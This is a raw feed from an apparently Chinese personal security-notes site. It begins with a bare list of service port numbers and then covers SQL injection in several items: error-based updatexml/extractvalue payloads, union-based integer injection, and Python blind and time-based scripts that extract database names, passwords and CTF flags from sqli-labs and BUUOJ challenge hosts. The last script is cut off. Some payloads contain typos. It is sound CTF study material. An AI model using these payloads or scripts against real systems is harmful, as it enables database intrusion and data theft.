3389
5900
5632
69
139
389
2094
53
6768
80
443
25
110
143
161
1433
1521
3306
5000
5432
6379
9200
270117
22122
81
8080
9080
9081
9090
3700
4848
83
84
85
86
87
88
161
389
445
512
513
514
873
1025
1433
1521
2082
2083
2222
2601
2604
3128
3306
3312
3311
3389
4440
4848
5984
6082
6379
7001
7002
7778
8083
8649
8888
9000
9200
9300
10000
11211
27017
27018
28017
50000
50070
50060
50030
&lt;/code>&lt;/pre></description></item><item><title>报错注入</title><link>http://localhost:1313/docs/network-security/php/sql%E6%B3%A8%E5%85%A5/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</link><pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate><guid>http://localhost:1313/docs/network-security/php/sql%E6%B3%A8%E5%85%A5/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</guid><description>&lt;p>报错注入&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>updatexml(&lt;span style="color:#ae81ff">1&lt;/span>,&lt;span style="color:#960050;background-color:#1e0010">欲查询代码&lt;/span>,&lt;span style="color:#ae81ff">1&lt;/span>)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>参数一：String，为XML对象&lt;/p>
&lt;p>参数二：XML语句&lt;/p>
&lt;p>参数三：查找到后欲替换的数据&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>extractvalue(&lt;span style="color:#ae81ff">1&lt;/span>,&lt;span style="color:#960050;background-color:#1e0010">欲查询代码&lt;/span>)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>参数一：String,为XML文档对象&lt;/p>
&lt;p>参数二：XML语句&lt;/p>
&lt;p>错误的xml语句会抛出错误，可以看到我们的查询语句&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">or&lt;/span> updatexml(&lt;span style="color:#ae81ff">1&lt;/span>,concat(&lt;span style="color:#ae81ff">0&lt;/span>x7e,(&lt;span style="color:#66d9ef">select&lt;/span> &lt;span style="color:#66d9ef">table_name&lt;/span> &lt;span style="color:#66d9ef">from&lt;/span> information_schema.tables &lt;span style="color:#66d9ef">where&lt;/span> table_schema&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">database&lt;/span>() &lt;span style="color:#66d9ef">limit&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>,&lt;span style="color:#ae81ff">1&lt;/span>),&lt;span style="color:#ae81ff">0&lt;/span>x7e),&lt;span style="color:#ae81ff">1&lt;/span>),&lt;span style="color:#e6db74">&amp;#39;2&amp;#39;&lt;/span>)&lt;span style="color:#f92672">#&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>适当修改查询语句即可&lt;/p>
&lt;p>报错语句过长，显示不全&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">select&lt;/span> mid(flag,&lt;span style="color:#ae81ff">1&lt;/span>,&lt;span style="color:#ae81ff">16&lt;/span>) &lt;span style="color:#66d9ef">from&lt;/span> flag
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">select&lt;/span> mid(flag,&lt;span style="color:#ae81ff">17&lt;/span>,&lt;span style="color:#ae81ff">16&lt;/span>) &lt;span style="color:#66d9ef">from&lt;/span> flag
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>多条数据用limit&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">select&lt;/span> flag &lt;span style="color:#66d9ef">from&lt;/span> flag &lt;span style="color:#66d9ef">limit&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>,&lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">select&lt;/span> flag &lt;span style="color:#66d9ef">from&lt;/span> flag &lt;span style="color:#66d9ef">limit&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>,&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>group_concat不能同时配合limit使用&lt;/p></description></item><item><title>整型注入</title><link>http://localhost:1313/docs/network-security/php/sql%E6%B3%A8%E5%85%A5/%E6%95%B4%E5%9E%8B%E6%B3%A8%E5%85%A5/</link><pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate><guid>http://localhost:1313/docs/network-security/php/sql%E6%B3%A8%E5%85%A5/%E6%95%B4%E5%9E%8B%E6%B3%A8%E5%85%A5/</guid><description>&lt;p>整形注入&lt;/p>
&lt;p>测试&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>id&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#66d9ef">and&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>查询字段数,小于等于不报错，大于报错&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>id&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#66d9ef">order&lt;/span> &lt;span style="color:#66d9ef">by&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>确定字段数后，数据库名&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>id&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1111&lt;/span> &lt;span style="color:#66d9ef">union&lt;/span> &lt;span style="color:#66d9ef">select&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>,&lt;span style="color:#ae81ff">2&lt;/span>,&lt;span style="color:#66d9ef">database&lt;/span>()
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>表名&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>id&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1111&lt;/span> &lt;span style="color:#66d9ef">union&lt;/span> &lt;span style="color:#66d9ef">select&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>,&lt;span style="color:#ae81ff">2&lt;/span>,group_concat(&lt;span style="color:#66d9ef">table_name&lt;/span>) form information_schema.tables &lt;span style="color:#66d9ef">where&lt;/span> table_schema&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">database&lt;/span>()&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#ae81ff">23&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>字段&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>id&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1111&lt;/span> &lt;span style="color:#66d9ef">union&lt;/span> &lt;span style="color:#66d9ef">select&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>,&lt;span style="color:#ae81ff">2&lt;/span>,group_concat(&lt;span style="color:#66d9ef">column_name&lt;/span>) form information_schema.columns &lt;span style="color:#66d9ef">where&lt;/span> &lt;span style="color:#66d9ef">and&lt;/span> table_schema&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">database&lt;/span>() &lt;span style="color:#66d9ef">table_name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;users&amp;#39;&lt;/span>&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#ae81ff">23&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>查值&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>id&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1111&lt;/span> &lt;span style="color:#66d9ef">union&lt;/span> &lt;span style="color:#66d9ef">select&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>,&lt;span style="color:#ae81ff">2&lt;/span>,username form users&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#ae81ff">23&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>查其他数据库&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>id&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1111&lt;/span> &lt;span style="color:#66d9ef">union&lt;/span> &lt;span style="color:#66d9ef">select&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>,&lt;span style="color:#ae81ff">2&lt;/span>,group_concat(&lt;span style="color:#66d9ef">schema_name&lt;/span>) form information_schema.schemata&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#ae81ff">23&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>时间注入</title><link>http://localhost:1313/docs/network-security/php/sql%E6%B3%A8%E5%85%A5/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/</link><pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate><guid>http://localhost:1313/docs/network-security/php/sql%E6%B3%A8%E5%85%A5/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/</guid><description>&lt;p>时间盲注&lt;/p>
&lt;p>不会抛出错误语句，怎们都是返回一样的&lt;/p>
&lt;p>jb不知道什么问题python发包时用parse不行，要直接拼在url上&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> requests&lt;span style="color:#f92672">,&lt;/span>time
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>name &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">1&lt;/span>,&lt;span style="color:#ae81ff">10&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> low &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">32&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> high &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">128&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> mid &lt;span style="color:#f92672">=&lt;/span> (low &lt;span style="color:#f92672">+&lt;/span> high) &lt;span style="color:#f92672">//&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> low &lt;span style="color:#f92672">&amp;lt;&lt;/span> high:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># 爆出数据库名&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> url&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;http://127.0.0.1/Less-9/?id=1&amp;#39; and if(ascii(substr((select database()),&lt;/span>&lt;span style="color:#e6db74">{0}&lt;/span>&lt;span style="color:#e6db74">,1))&amp;gt;&lt;/span>&lt;span style="color:#e6db74">{1}&lt;/span>&lt;span style="color:#e6db74">,sleep(1),0)--+&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(i,mid)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> start_time &lt;span style="color:#f92672">=&lt;/span> time&lt;span style="color:#f92672">.&lt;/span>time() &lt;span style="color:#75715e"># 注入前的系统时间&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> r &lt;span style="color:#f92672">=&lt;/span> requests&lt;span style="color:#f92672">.&lt;/span>get(url)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> end_time &lt;span style="color:#f92672">=&lt;/span> time&lt;span style="color:#f92672">.&lt;/span>time() &lt;span style="color:#75715e"># 注入后的时间&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> end_time &lt;span style="color:#f92672">-&lt;/span> start_time &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> low &lt;span style="color:#f92672">=&lt;/span> mid &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> high &lt;span style="color:#f92672">=&lt;/span> mid
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> mid &lt;span style="color:#f92672">=&lt;/span> (low &lt;span style="color:#f92672">+&lt;/span> high) &lt;span style="color:#f92672">//&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> mid &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">32&lt;/span> &lt;span style="color:#f92672">or&lt;/span> mid &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">128&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> name &lt;span style="color:#f92672">=&lt;/span> name &lt;span style="color:#f92672">+&lt;/span> chr(mid) 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print (name)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>盲注</title><link>http://localhost:1313/docs/network-security/php/sql%E6%B3%A8%E5%85%A5/%E7%9B%B2%E6%B3%A8/</link><pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate><guid>http://localhost:1313/docs/network-security/php/sql%E6%B3%A8%E5%85%A5/%E7%9B%B2%E6%B3%A8/</guid><description>&lt;p>盲注就是回显只有对或者错的情况（如0，1）&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#e6db74">&amp;#39; or &amp;#39;&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#e6db74">&amp;#39;=&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#e6db74">&amp;#39; group by passwd with rollup having passwd is NULL — –
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>测试极客大挑战&lt;strong>finalsql&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> requests
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> time
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>g&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>host &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;http://e7adeb0b-7190-4ea3-bd06-49e63e17e775.node4.buuoj.cn:81/backend/content_detail.php&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>parse&lt;span style="color:#f92672">=&lt;/span>{&lt;span style="color:#e6db74">&amp;#39;id&amp;#39;&lt;/span>:&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">getDatabase&lt;/span>(): &lt;span style="color:#75715e">#获取数据库名&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">global&lt;/span> host
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ans&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">1&lt;/span>,&lt;span style="color:#ae81ff">1000&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> low &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">32&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> high &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">128&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> mid &lt;span style="color:#f92672">=&lt;/span> (low&lt;span style="color:#f92672">+&lt;/span>high)&lt;span style="color:#f92672">//&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> low &lt;span style="color:#f92672">&amp;lt;&lt;/span> high:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> time&lt;span style="color:#f92672">.&lt;/span>sleep(&lt;span style="color:#ae81ff">0.1&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># 1^(ascii(substr((select(database())),%d,1))&amp;lt;%d)^1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># 1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))&amp;lt;%d)^1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># 1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&amp;#39;users&amp;#39;)),%d,1))&amp;lt;%d)^1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># 1^(ascii(substr((select(group_concat(password))from(users)),%d,1))&amp;lt;%d)^1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># 1^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&amp;lt;%d)^1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># 1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&amp;#39;ctftraining&amp;#39;)),%d,1))&amp;lt;%d)^1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># 1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_schema=&amp;#39;ctftraining&amp;#39;(and)schema_name=&amp;#39;ctftraining&amp;#39;)),%d,1))&amp;lt;%d)^1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># 1^(ascii(substr((select(group_concat(Flag))from(ctftraining.Flag)),%d,1))&amp;lt;%d)^1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parse[&lt;span style="color:#e6db74">&amp;#39;id&amp;#39;&lt;/span>]&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;1^(ascii(substr((select(group_concat(Flag))from(ctftraining.Flag)),&lt;/span>&lt;span style="color:#e6db74">%d&lt;/span>&lt;span style="color:#e6db74">,1))&amp;lt;&lt;/span>&lt;span style="color:#e6db74">%d&lt;/span>&lt;span style="color:#e6db74">)^1&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> (i,mid)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> res &lt;span style="color:#f92672">=&lt;/span> requests&lt;span style="color:#f92672">.&lt;/span>get(host,params&lt;span style="color:#f92672">=&lt;/span>parse)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> res&lt;span style="color:#f92672">.&lt;/span>status_code&lt;span style="color:#f92672">!=&lt;/span>&lt;span style="color:#ae81ff">200&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#39;!200&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">continue&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># print(res.text)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#e6db74">&amp;#34;title&amp;#34;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> res&lt;span style="color:#f92672">.&lt;/span>text:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> high &lt;span style="color:#f92672">=&lt;/span> mid
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> low &lt;span style="color:#f92672">=&lt;/span> mid&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> mid&lt;span style="color:#f92672">=&lt;/span>(low&lt;span style="color:#f92672">+&lt;/span>high)&lt;span style="color:#f92672">//&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> mid &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">32&lt;/span> &lt;span style="color:#f92672">or&lt;/span> mid &lt;span style="color:#f92672">&amp;gt;=&lt;/span>&lt;span style="color:#ae81ff">127&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(mid&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#ae81ff">33&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> g&lt;span style="color:#f92672">+=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(g&lt;span style="color:#f92672">&amp;gt;=&lt;/span>&lt;span style="color:#ae81ff">5&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> g&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ans &lt;span style="color:#f92672">+=&lt;/span> chr(mid&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;database is -&amp;gt; &amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>ans)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>getDatabase()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># news&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># admin,contents&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> requests
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> time
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>url &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;http://2adc3617-76d6-4705-84e4-1c0e3f21baa2.node4.buuoj.cn:81/search.php&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>payload &lt;span style="color:#f92672">=&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;id&amp;#34;&lt;/span> : &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>result &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>g&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">1&lt;/span>,&lt;span style="color:#ae81ff">1000&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> l &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">33&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> r &lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">130&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> mid &lt;span style="color:#f92672">=&lt;/span> (l&lt;span style="color:#f92672">+&lt;/span>r)&lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span>(l&lt;span style="color:#f92672">&amp;lt;&lt;/span>r):
